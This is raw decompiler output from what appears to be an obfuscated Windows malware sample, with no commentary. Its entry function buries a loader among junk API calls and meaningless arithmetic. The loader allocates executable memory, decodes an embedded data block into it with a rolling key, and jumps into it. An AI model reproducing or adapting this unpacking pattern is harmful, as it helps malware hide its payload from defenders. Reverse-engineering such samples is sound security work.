  v8 = (int *)(*(unsigned int *)((char *)&retaddr + 1) | v4);
  v9 = v6 < (unsigned int)v8;
  if ( (int *)v6 == v8 )
  {
    v8 = &savedregs;
    v6 = *(unsigned int *)((char *)&retaddr + 3) ^ (((unsigned int)&savedregs | v6) + 13170);
    v9 = 0;
  }
  return (char *)v8 + v9 + v6;
}
// 401D48: variables would overlap: ^2A4.4(retaddr) and ^2A5.4,^2A7.4
// 401D48: using guessed type _DWORD anonymous_3[12];

//----- (00402080) --------------------------------------------------------
unsigned int __fastcall sub_402080(int a1, int a2)
{
  HWND ActiveWindow; // eax
  int v3; // edx
  int v5; // [esp+E8h] [ebp-2F8h]
  struct HKEY__ hKey; // [esp+300h] [ebp-E0h] BYREF
  __int16 Name[12]; // [esp+33Ch] [ebp-A4h] BYREF
  char v8; // [esp+354h] [ebp-8Ch]
  int v9; // [esp+384h] [ebp-5Ch]
  int v10; // [esp+3DCh] [ebp-4h]

  v10 ^= a2;
  if ( a1 == v5 )
    v8 |= 0xA5u;
  RegEnumKeyW(&hKey, 0x16u, (LPWSTR)Name, 0);
  v9 ^= 0x9Au;
  ActiveWindow = GetActiveWindow();
  return v3 | (unsigned int)ActiveWindow;
}
// 402094: variable 'v5' is possibly undefined
// 40212C: variable 'v3' is possibly undefined
// 402080: using guessed type WCHAR Name[12];

//----- (004022A8) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
UINT __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, __int64 a4, int a5)
{
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edx
  int v11; // ecx
  int v12; // ecx
  HWND v13; // edx
  int v14; // ecx
  int WindowTextA; // eax
  int v16; // edx
  int v17; // ecx
  int v18; // eax
  int v19; // edx
  int v20; // edx
  int v21; // ecx
  unsigned int v22; // eax
  int v23; // edx
  int v24; // edx
  int v25; // eax
  int CurrentProcessId; // eax
  int v27; // ecx
  int CurrentThreadId; // eax
  int v29; // ecx
  int v30; // ett
  int v31; // edx
  int v32; // ecx
  int v33; // ecx
  int v34; // eax
  int v35; // edx
  int v36; // edx
  UINT DriveTypeA; // eax
  int v38; // eax
  int v39; // eax
  int v40; // ecx
  int v41; // edx
  __int64 v42; // rax
  char v43; // cl
  HANDLE v44; // eax
  DWORD v45; // eax
  int v46; // edx
  int v47; // ecx
  int v48; // edx
  int v49; // ecx
  int v50; // ecx
  int v51; // ecx
  int v52; // edx
  int *v53; // ecx
  char *v54; // edx
  int v55; // ecx
  int v56; // eax
  unsigned int v57; // edx
  int v58; // ecx
  char *v59; // ebx
  _DWORD *v60; // esi
  int v61; // edx
  int v62; // ecx
  int v63; // edi
  int v64; // ecx
  int v65; // edi
  char *v66; // ebx
  char *v67; // esi
  int v68; // edx
  __int16 v69; // ax
  int v70; // eax
  int v71; // ecx
  DWORD v72; // ecx
  int v73; // edx
  LPVOID v75; // [esp-8h] [ebp-3F0h]
  SIZE_T v76; // [esp-4h] [ebp-3ECh]
  DWORD v77; // [esp+0h] [ebp-3E8h]
  DWORD v78; // [esp+4h] [ebp-3E4h]
  int v79; // [esp+8h] [ebp-3E0h]
  int v80; // [esp+Ch] [ebp-3DCh]
  int v81; // [esp+10h] [ebp-3D8h]
  int v82; // [esp+14h] [ebp-3D4h]
  char *v83; // [esp+18h] [ebp-3D0h]
  int *v84; // [esp+1Ch] [ebp-3CCh]
  int v85; // [esp+20h] [ebp-3C8h]
  char v86[20]; // [esp+24h] [ebp-3C4h] BYREF
  __int16 v87; // [esp+38h] [ebp-3B0h]
  int v88; // [esp+44h] [ebp-3A4h]
  int v89; // [esp+5Ch] [ebp-38Ch]
  int v90; // [esp+6Ch] [ebp-37Ch]
  __int16 v91; // [esp+70h] [ebp-378h] BYREF
  unsigned int v92; // [esp+74h] [ebp-374h]
  char v93; // [esp+7Ch] [ebp-36Ch] BYREF
  int v94; // [esp+80h] [ebp-368h]
  int v95[2]; // [esp+84h] [ebp-364h]
  char v96; // [esp+8Ch] [ebp-35Ch] BYREF
  int v97; // [esp+90h] [ebp-358h]
  int v98[2]; // [esp+98h] [ebp-350h]
  int v99; // [esp+A0h] [ebp-348h]
  char v100; // [esp+C0h] [ebp-328h]
  __int16 v101; // [esp+D4h] [ebp-314h]
  char v102; // [esp+DCh] [ebp-30Ch]
  int v103; // [esp+F4h] [ebp-2F4h]
  __int16 v104; // [esp+FCh] [ebp-2ECh]
  __int16 v105; // [esp+110h] [ebp-2D8h]
  int v106; // [esp+130h] [ebp-2B8h]
  int v107; // [esp+144h] [ebp-2A4h]
  int v108; // [esp+150h] [ebp-298h]
  int v109; // [esp+154h] [ebp-294h]
  int v110; // [esp+15Ch] [ebp-28Ch]
  int v111; // [esp+160h] [ebp-288h]
  int v112; // [esp+168h] [ebp-280h]
  char v113; // [esp+180h] [ebp-268h]
  int v114; // [esp+194h] [ebp-254h]
  int v115; // [esp+198h] [ebp-250h]
  int v116; // [esp+19Ch] [ebp-24Ch]
  __int16 v117; // [esp+1A4h] [ebp-244h]
  int v118; // [esp+1B8h] [ebp-230h]
  int v119; // [esp+1CCh] [ebp-21Ch]
  char v120; // [esp+1E0h] [ebp-208h]
  int v121; // [esp+1E4h] [ebp-204h]
  int v122; // [esp+1F4h] [ebp-1F4h]
  int v123; // [esp+1F8h] [ebp-1F0h]
  int v124; // [esp+214h] [ebp-1D4h]
  int v125; // [esp+23Ch] [ebp-1ACh]
  int v126; // [esp+244h] [ebp-1A4h]
  int v127; // [esp+248h] [ebp-1A0h]
  char v128; // [esp+250h] [ebp-198h]
  int v129; // [esp+254h] [ebp-194h]
  __int16 v130; // [esp+258h] [ebp-190h]
  __int16 v131; // [esp+260h] [ebp-188h]
  char v132; // [esp+270h] [ebp-178h]
  int v133; // [esp+281h] [ebp-167h] BYREF
  _BYTE v134[6]; // [esp+286h] [ebp-162h]
  int v135; // [esp+28Dh] [ebp-15Bh]
  char v136; // [esp+294h] [ebp-154h]
  int v137; // [esp+29Ch] [ebp-14Ch]
  int v138; // [esp+2A0h] [ebp-148h]
  int v139; // [esp+2B4h] [ebp-134h]
  _BYTE v140[7]; // [esp+2CDh] [ebp-11Bh]
  char v141; // [esp+2D8h] [ebp-110h] BYREF
  __int16 v142; // [esp+2DCh] [ebp-10Ch]
  HKEY phkResult; // [esp+2ECh] [ebp-FCh] BYREF
  int v144; // [esp+2F0h] [ebp-F8h]
  BYTE Data[4]; // [esp+300h] [ebp-E8h] BYREF
  int v146; // [esp+308h] [ebp-E0h]
  HKEY RootPathName; // [esp+30Ch] [ebp-DCh] BYREF
  __int16 SubKey[6]; // [esp+310h] [ebp-D8h] BYREF
  char v149[8]; // [esp+31Ch] [ebp-CCh] BYREF
  char v150[16]; // [esp+324h] [ebp-C4h] BYREF
  struct _FILETIME v151; // [esp+334h] [ebp-B4h] BYREF
  struct HKEY__ hKey; // [esp+33Ch] [ebp-ACh] BYREF
  int Reserved[2]; // [esp+344h] [ebp-A4h] BYREF
  struct HKEY__ v154[2]; // [esp+34Ch] [ebp-9Ch] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+354h] [ebp-94h] BYREF
  WCHAR v156[2]; // [esp+35Ch] [ebp-8Ch] BYREF
  DWORD cchValueName; // [esp+360h] [ebp-88h] BYREF
  WCHAR v158; // [esp+364h] [ebp-84h] BYREF
  CHAR String[4]; // [esp+368h] [ebp-80h] BYREF
  int v160; // [esp+378h] [ebp-70h]
  int pSid1[4]; // [esp+380h] [ebp-68h] BYREF
  struct HKEY__ v162; // [esp+390h] [ebp-58h] BYREF
  int v163; // [esp+394h] [ebp-54h]
  __int16 v164; // [esp+398h] [ebp-50h]
  struct HKEY__ v165; // [esp+39Ch] [ebp-4Ch] BYREF
  __int16 v166; // [esp+3C0h] [ebp-28h]
  char v167; // [esp+3C4h] [ebp-24h]
  int v168; // [esp+3C8h] [ebp-20h]
  char v169; // [esp+3D4h] [ebp-14h]
  int v170; // [esp+3E4h] [ebp-4h]
  int savedregs; // [esp+3E8h] [ebp+0h] OVERLAPPED BYREF
  char *retaddr; // [esp+3ECh] [ebp+4h] OVERLAPPED

  GetCurrentThreadId();
  if ( v97 + v6 == 589 )
  {
    LOBYTE(v121) = v121 ^ 0x7B;
    v123 ^= v5;
    v160 ^= (unsigned int)&v141;
  }
  _p__commode();
  v168 |= v7;
  if ( v7 )
  {
    v87 += 15;
    v104 &= 0xFu;
  }
  EqualSid(pSid1, &SystemTimeAsFileTime.dwHighDateTime);
  GetWindowDC(0);
  v8 = RegOpenKeyW(&v162, &v158, &RootPathName);
  sub_401D48(v8, v9 - *(_DWORD *)v134 - 9425, (char *)&v133 + 3);
  _p__fmode();
  if ( v11 == (v10 | 0x1633) )
  {
    v111 |= 0xD1u;
    LOBYTE(v90) = v90 + 58;
  }
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  GetCurrentThreadId();
  sub_402080(v12, (int)&savedregs);
  WindowTextA = GetWindowTextA(v13, String, v14);
  v18 = sub_401548(WindowTextA, v16, v17, *(__int128 *)&v86[4]);
  *(_DWORD *)v86 = 2;
  if ( v18 != 654 )
  {
    v170 += v19 - v18;
    v91 -= 157;
  }
  _set_app_type(*(_crt_app_type *)v86);
  v22 = sub_402080(v21, v21 | (v20 + 12445));
  v126 |= *(_DWORD *)v86;
  v24 = v22 + v23;
  if ( !v22 )
  {
    v119 ^= v24;
    v25 = v110 ^ -v24;
    *(_DWORD *)String ^= v25;
    v103 += v25;
  }
  GetSystemTimeAsFileTime(&v151);
  v142 ^= 0xF4u;
  _setusermatherr(*(_UserMathErrorFunctionPointer *)&v86[4]);
  CurrentProcessId = GetCurrentProcessId();
  sub_401868(CurrentProcessId, v27);
  _setusermatherr(*(_UserMathErrorFunctionPointer *)&v86[4]);
  CurrentThreadId = GetCurrentThreadId();
  v30 = (__PAIR64__(CurrentThreadId, CurrentThreadId) + v92) >> 32;
  v92 += CurrentThreadId;
  sub_401D48(CurrentThreadId, v31, (char *)((v29 | 0x38E4) - v30));
  RegOpenKeyW((HKEY)&v151.dwHighDateTime, (LPCWSTR)SubKey, (PHKEY)&SystemTimeAsFileTime.dwHighDateTime);
  *(_DWORD *)v86 = 2;
  if ( v32 != 604 )
  {
    LOBYTE(v94) = v94 + 116;
    SubKey[0] = SubKey[0] & 0x80;
    LOWORD(v99) = v99 | 0x14;
  }
  _set_app_type(*(_crt_app_type *)v86);
  v167 += 16;
  sub_401548(v34 ^ 0xEDB, v35, v33 | 0x1BF8, *(__int128 *)v86);
  malloc(0x1Fu);
  v105 -= 206;
  sub_402080((int)&savedregs, v36 - a4 - *(_DWORD *)((char *)&a4 + 1) - *(int *)((char *)&savedregs + 1));
  DriveTypeA = GetDriveTypeA((LPCSTR)&RootPathName);
  LOBYTE(v166) = v166 | 0x6B;
  v38 = DriveTypeA | 0x2802;
  if ( v138 != v38 )
  {
    v137 |= v38;
    v120 ^= 0xDEu;
  }
  malloc(0x16u);
  GetCurrentProcessId();
  LOBYTE(v146) = v146 + 118;
  v39 = RegOpenKeyW(&hKey, v156, (PHKEY)&SystemTimeAsFileTime);
  SystemTimeAsFileTime.dwHighDateTime ^= v39;
  *(_DWORD *)&v140[3] |= v40;
  v117 |= 0x9Bu;
  sub_401B20(v39, v41, v40, *(__int64 *)&v86[4]);
  _p__commode();
  LODWORD(v42) = _p__fmode();
  cchValueName |= v42;
  sub_4017D8(v42);
  IsBadReadPtr(v149, 0xFu);
  GetActiveWindow();
  v44 = OpenEventA(v43 & 0x1F, 0, v150);
  v118 -= 134;
  sub_401868(
    savedregs ^ ((v135 ^ ((unsigned int)v44 + v133)) - *(_DWORD *)((char *)&a4 + 1) - (_DWORD)retaddr),
    (int)&savedregs);
  RegEnumValueA(v154, (unsigned int)&cchValueName & 6, 0, &cchValueName, (LPDWORD)Reserved, &cchValueName, Data, 0);
  v45 = GetCurrentProcessId();
  if ( v47 == 976 )
  {
    v125 ^= v45;
    LOWORD(v45) = LOWORD(SystemTimeAsFileTime.dwHighDateTime) ^ v45;
    v101 |= 0xCDu;
  }
  v130 &= 0xA7u;
  *(_DWORD *)v86 = 0;
  if ( v46 == (v45 & 0x22DC) )
    pSid1[0] ^= v46;
  if ( CoGetContextToken(*(ULONG_PTR **)v86) == 0x80004003 )
  {
    v50 = v49 ^ 0x16FE;
    if ( !v50 )
    {
      v136 |= 0xC4u;
      v166 |= 0xCFu;
      v50 = 0;
      LOBYTE(v106) = v106 & 0x96;
    }
    *(_DWORD *)v86 = a3;
    v85 = a2;
    v84 = &savedregs;
    v83 = &v86[4];
    v82 = a1;
    v81 = v50;
    v80 = v48 ^ 0x25D7;
    v79 = 0;
    v51 = (v48 ^ 0x25D7) + v50;
    v78 = 64;
    v52 = ((v48 ^ 0x25D7) & 0x4D7 ^ 0xB0A) + 13664;
    v77 = 4096;
    if ( (v51 | 0xB0A) != 614 )
      v164 += 163;
    v76 = 0x4000;
    v53 = &savedregs;
    v54 = &retaddr[*(int *)((char *)&savedregs + 1) ^ v52];
    v114 &= (unsigned int)&savedregs;
    if ( !&savedregs )
    {
      v132 -= 118;
      v102 = 0;
      v53 = (int *)((unsigned int)&v54[-MEMORY[2]] & MEMORY[8]);
      LOBYTE(v114) = v114 & 0xBC;
    }
    v75 = 0;
    if ( !v53 )
      LOWORD(v122) = v122 + 236;
    *(_DWORD *)v156 = VirtualAlloc(v75, v76, v77, v78);
    v56 = (*(unsigned int *)((char *)&retaddr + 2) | *(_DWORD *)v156) - *(_DWORD *)((char *)&a4 + 2);
    v57 = (unsigned int)&v96;
    v58 = *(int *)((char *)v98 + 3) & (v98[0] ^ a5 ^ v55);
    v121 -= 220;
    if ( &v96 == (char *)v56 )
    {
      v57 = (unsigned int)&savedregs;
      v56 -= *(_DWORD *)&v134[2];
      LOBYTE(v114) = v114 ^ 0x3B;
    }
    v59 = (char *)&unk_406107;
    v60 = *(_DWORD **)v156;
    v88 = 795465371;
    v61 = v56 & (v57 | 0x38E4);
    do
    {
      if ( v56 == 109 )
      {
        v151.dwHighDateTime &= v61;
        v62 = v58 - v99;
        LOWORD(v99) = v99 ^ 0x19;
        v169 ^= 0xF9u;
        v58 = __CFADD__(v62 - v61, 109) + v62 - v61 + 109 + 109;
      }
      v63 = *(_DWORD *)v59;
      if ( v61 )
      {
        v61 = (int)&v93;
        v56 = v94 + (v95[0] & ((v56 & 0xFB) - (v144 ^ v58)));
        v64 = (*(int *)((char *)v95 + 3) ^ v144 ^ v58) - v129;
        v98[0] &= v64;
        v58 = v64 & 0x3B6E;
      }
      v65 = v88 + v63;
      LOWORD(v115) = v115 - 110;
      v56 -= 110;
      v89 ^= v61;
      v88 -= 759728016;
      if ( v56 == v61 )
      {
        v146 |= v61;
        v58 += 6113;
        v56 = v61 | (v56 - v61) ^ 0x17E1;
      }
      *v60 = v65;
      if ( (v56 & v124) == 0 )
      {
        v58 = ((v61 + (*(_DWORD *)v140 | v58)) | 0x31A5) - 2163;
        v56 = (int)&savedregs - 6490;
        v127 -= (int)&savedregs - 6490;
      }
      v66 = v59 + 1252052256;
      v67 = (char *)v60 - 946412154;
      v61 &= v56;
      if ( v58 == v61 )
        v139 |= v61;
      v59 = v66 - 1252052252;
      LOWORD(v116) = v116 ^ 0x68;
      v131 ^= 0xAu;
      v60 = v67 + 946412158;
      v128 ^= 0x1Fu;
      v58 ^= v106;
    }
    while ( v59 != (char *)&unk_40701B );
    v68 = v61 | 0xD1F;
    v163 |= 0xB9u;
    v108 &= 0x83u;
    if ( &v91 == (__int16 *)256 )
    {
      v58 += v68;
      v107 |= 0x70u;
    }
    v69 = (*(int (__fastcall **)(int, int, int, int, int, int, char *, int *, int, _DWORD))v156)(
            v58,
            v68,
            v79,
            v80,
            v81,
            v82,
            v83,
            v84,
            v85,
            *(_DWORD *)v86);
    v169 |= 0x3Fu;
    v70 = v69 & 0x3BDD;
    if ( (v71 & v109) != 0 )
    {
      v112 ^= v70;
      v115 += (int)&savedregs;
      v100 += 79;
    }
  }
  RegOpenKeyW(&v165, (LPCWSTR)v154, &phkResult);
  v113 += 44;
  GetStdHandle(v72);
  GetWindowTextA((HWND)0xD4DA3AED, (LPSTR)&v162, v73);
  return GetDriveTypeW((LPCWSTR)&phkResult);
}
// 40272B: conditional instruction was optimized away because eax.4==0
// 4022A8: variables would overlap: ^3F0.4 and ^3F1.4
// 4022A8: variables would overlap: ^3F4.4(retaddr) and ^3F6.4
// 4022A8: using guessed type int pSid1[4];
// 4022A8: using guessed type WCHAR SubKey[6];
// 4022A8: using guessed type char var_CC[8];
// 4022A8: using guessed type DWORD Reserved[2];
// 4022A8: using guessed type _DWORD var_350[2];
// 4022A8: using guessed type _DWORD anonymous_6[2];
// 4022A8: using guessed type CHAR anonymous_9[16];

// nfuncs=9 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
